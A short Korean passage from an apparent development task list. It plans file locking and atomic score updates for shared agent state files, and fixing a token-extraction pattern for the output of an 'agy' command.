2. 공유 상태 신뢰성 — `LOG.md` / `.agent_scores.json` 락, `record-score.sh` 원자적 갱신, `_agy_stdout.log` 잔재 기반 에이전트 오판 제거
3. agy 토큰 추출 패턴 확정 — 실제 agy --print 출력 샘플 수집 후 T-M13-E 보완 패치
